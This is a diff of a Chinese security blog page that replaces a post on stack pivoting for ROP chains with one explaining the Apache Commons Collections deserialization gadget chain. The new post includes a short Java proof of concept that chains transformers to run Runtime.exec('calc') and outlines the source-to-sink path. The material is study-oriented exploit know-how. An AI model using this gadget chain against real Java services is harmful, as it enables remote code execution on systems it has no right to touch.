@@ -4,10 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="栈迁移, 0x00dream&#39;s blog">
-    <meta name="description" content="1.定义原理：栈迁移实际上是解决当原始栈可读入字符串长度不够的情况下rop链往哪儿写的问题，因为rop链必须借助栈溢出来达到攻击手段，所以rop链必须写在栈上，所以我们需要改变rsp的值来改变栈帧为能容纳rop链的那块区域。
-
-2.利用方式">
+    <meta name="keywords" content="CC链, 0x00dream&#39;s blog">
+    <meta name="description" content="漏洞原理###1.transform
+在org/apache/commons/collections/functors/InvokerTransformer#transform中存在一段利用反射技术执行任意代码的代码，这就是CC链的核心，我">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>栈迁移 | 0x00dream&#39;s blog</title>
+    <title>CC链 | 0x00dream&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -291,12 +290,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">栈迁移</h1>
+                    <h1 class="description center-align post-title">CC链</h1>
                 </div>
             </div>
         </div>
@@ -412,8 +411,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                                <span class="chip bg-color">二进制安全,栈溢出</span>
+                            <a href="/tags/java%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">java安全</span>
                             </a>
                         
                     </div>
@@ -428,28 +427,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-09-03
+                    2025-03-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-09-06
+                    2025-03-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    230
+                    498
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -467,15 +466,53 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><p>原理：栈迁移实际上是解决当原始栈可读入字符串长度不够的情况下<code>rop链</code>往哪儿写的问题，因为<code>rop链</code>必须借助栈溢出来达到攻击手段，所以<code>rop链</code>必须写在栈上，所以我们需要改变<code>rsp</code>的值来改变栈帧为能容纳<code>rop链</code>的那块区域。</p>
-<p><img src="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/image-20240903113700758.png" alt="image-20240903113700758"></p>
-<h2 id="2-利用方式"><a href="#2-利用方式" class="headerlink" title="2.利用方式"></a>2.利用方式</h2><h3 id="1-pop-rsp"><a href="#1-pop-rsp" class="headerlink" title="1.pop rsp"></a>1.pop rsp</h3><p><img src="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/image-20240903113850415.png" alt="image-20240903113850415"></p>
-<h3 id="2-leave-ret"><a href="#2-leave-ret" class="headerlink" title="2.leave ret"></a>2.leave ret</h3><p><img src="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/image-20240903113918379.png" alt="image-20240903113918379"></p>
-<h3 id="3-利用xchg"><a href="#3-利用xchg" class="headerlink" title="3.利用xchg"></a>3.利用xchg</h3><p> <code>xchg</code>是交换指令，在<code>gdb</code>里<code>search xchg</code>,找到该指令的<code>gadget</code>片段，利用 将<code>rsp</code>和其他寄存器的值进行交换的指令，来控制这个寄存器的值从而控制<code>rsp</code>的值来达到栈迁移的目的。</p>
-<p><code>search xchg % rsp</code>  或者  <code>search mov % rsp</code></p>
-<h2 id="3-案例"><a href="#3-案例" class="headerlink" title="3.案例"></a>3.案例</h2><p><img src="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/image-20240903202935442.png" alt="image-20240903202935442"></p>
-<p>这段<code>exp</code>太抽象了，理解起来很不容易，多次进行栈迁移。</p>
-<p>总之，要在新的区域构造<code>rop链</code>，就要修改<code>rsp</code>把栈迁移过去。</p>
+                <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>###1.transform</p>
+<p>在<code>org/apache/commons/collections/functors/InvokerTransformer#transform</code>中存在一段利用反射技术执行任意代码的代码，这就是CC链的核心，我们后续利用CC链攻击的时候实际上就是想方设法构造链条让程序去执行这个<code>transform</code>方法，给它传入一个恶意类，它就可以通过它本身其中的反射技术去执行这个恶意类。例如，传入的是<code>Runtime</code>对象时，就可以执行任意系统命令。</p>
+<h3 id="2-ChainedTransformer"><a href="#2-ChainedTransformer" class="headerlink" title="2.ChainedTransformer"></a>2.ChainedTransformer</h3><p>在<code>org/apache/commons/collections/functors/ChainedTransformer#transform</code>中，通过遍历<code>this.iTransformers</code>来调用数组中每一个对象的<code>transform</code>方法。结合上面的代码，可以构造出链式调用<code>Runtime.getRuntime().exec("calc")</code>，此时便成功向系统注入了一个<code>Runtime</code>对象，完成了任意代码执行，这便是<code>Commons Collection</code>反序列化漏洞的核心。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        object <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> object<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用<code>ChainedTransformer</code>执行系统命令<code>POC</code>源码如下：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+                <span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                        <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+                <span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        chainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>有了能够执行任意代码的利用点，还需要一个反序列化的触发点，也就是调用某个类的<code>readObject</code>方法。当某个类的<code>readObject</code>方法可以通过一定的代码逻辑到达漏洞的利用点时，就可以利用它进行漏洞的触发。</p>
+<h3 id="1-sink执行点"><a href="#1-sink执行点" class="headerlink" title="1.sink执行点"></a>1.sink执行点</h3><p>作用：触发RCE执行</p>
+<p>CC链主要的触发点就是下面三个类的<code>transform</code>方法</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ChainedTransformer</span>#<span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token class-name">ConstantTransformer</span>#<span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token class-name">InvokerTransformer</span>#<span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2-寻找gadget调用链"><a href="#2-寻找gadget调用链" class="headerlink" title="2.寻找gadget调用链"></a>2.寻找gadget调用链</h3><p>作用：调用链实现承上启下</p>
+<p>一直寻找到被<code>readObject</code>调用的函数为止</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TransfotmedMap</span>#checkSetValue
+<span class="token class-name">MapEntry</span>#setValue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="3-寻找Source入口点"><a href="#3-寻找Source入口点" class="headerlink" title="3.寻找Source入口点"></a>3.寻找Source入口点</h3><p>作用：入口点重写方法调用</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">AnnotationInvocationHandler</span>#<span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>#setValue
+<span class="token class-name">ObjectInputStream</span>#<span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
 
                 
             </div>
@@ -502,7 +539,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://0x00dream.github.io/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/">http://0x00dream.github.io/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/</a>
+                    <a href="http://0x00dream.github.io/2025/03/30/java-an-quan/cc-lian/">http://0x00dream.github.io/2025/03/30/java-an-quan/cc-lian/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -540,8 +577,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                                    <span class="chip bg-color">二进制安全,栈溢出</span>
+                                <a href="/tags/java%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">java安全</span>
                                 </a>
                             
                         </div>
@@ -717,13 +754,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2024/09/04/er-jin-zhi-an-quan/zhan-yi-chu/srop/">
+                <a href="/2025/03/30/java-an-quan/shiro-fan-xu-lie-hua/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="SROP">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="shiro反序列化">
                         
-                        <span class="card-title">SROP</span>
+                        <span class="card-title">shiro反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -734,7 +771,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-04
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-30
                         </span>
                         <span class="publish-author">
                             
@@ -747,8 +784,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                        <span class="chip bg-color">二进制安全,栈溢出</span>
+                    <a href="/tags/java%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">java安全</span>
                     </a>
                     
                 </div>
@@ -762,13 +799,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/ret2csu/">
+                <a href="/2025/03/17/web-an-quan/ssrf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="ret2csu">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="SSRF">
                         
-                        <span class="card-title">ret2csu</span>
+                        <span class="card-title">SSRF</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -779,7 +816,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-17
                             </span>
                         <span class="publish-author">
                             
@@ -792,8 +829,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                        <span class="chip bg-color">二进制安全,栈溢出</span>
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
                     </a>
                     
                 </div>
